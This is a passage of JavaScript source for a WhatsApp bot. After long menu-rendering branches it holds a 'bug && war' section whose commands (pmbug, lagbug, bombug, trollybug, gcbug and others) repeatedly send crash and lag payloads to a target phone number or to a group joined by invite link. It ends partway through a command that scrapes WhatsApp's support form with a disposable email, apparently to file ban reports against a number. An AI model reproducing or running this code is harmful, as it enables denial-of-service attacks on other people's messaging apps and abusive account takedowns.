                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'animemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${animemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'stickermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stickermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'databasemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${databasemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'aimenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${aimenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'bugmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${bugmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'checkaccount':
            case 'account': {
               let a = db.data.users[sender]
               let b = `Below is your account information\n`
               b += `================================\n`
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               b += `Title: ${a.title}\n`
               b += `Afk Time: ${a.afkTime}\n`
               b += `Afk Reason: ${a.afkReason}\n` 
               b += `Nickname: ${a.nick}\n`
               b += `Premium Status: ${a.premium}\n`
               b += `Your Limit: ${a.limit}\n`
               b += `================================`
               SenseiOfc.sendMessage(sender, { text: b }, { quoted: m })
               replygc('Account Details Has Been Sent In Private Chat')
            }
            break
            case 'limit':
            case 'checklimit': {
               let a = db.data.users[sender]
               let b = `Your Limit ${a.limit}\n` 
               b += `Premium Status ${isPrem ? 'On' : 'Off' }\n` 
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               replygc(b)
            }
            break
            
            //bug && war cases 
//⚠️do not edit cases otherwise bug not work
//bug cases
case 'amountbug': {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygc(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPremium) return replygc(mess.premium)
 if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygc(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygc(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'docubug': {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
if (args.length < 1) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygc(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygc(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygc(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'lagbug' : {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygc(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'trollybug': {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
SenseiOfc.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygc(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'gcbug' : {
if (!isPremium) return replygc(mess.premium)
 if (!args[0]) return replygc(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await SenseiOfc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygc(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'delaygcbug' :  {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await SenseiOfc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygc(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'laggcbug' :  {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await SenseiOfc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygc(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'bomgcbug' :  {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygc(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'unlimitedgcbug' :  {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await SenseiOfc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygc(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'trollygcbug' :  {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await SenseiOfc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
SenseiOfc.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
replygc(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'docugcbug' :  {
if (!isPremium) return replygc(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await SenseiOfc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
SenseiOfc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygc(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
} 
break

//ban/unban cases
case 'out': case 'verif':{
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
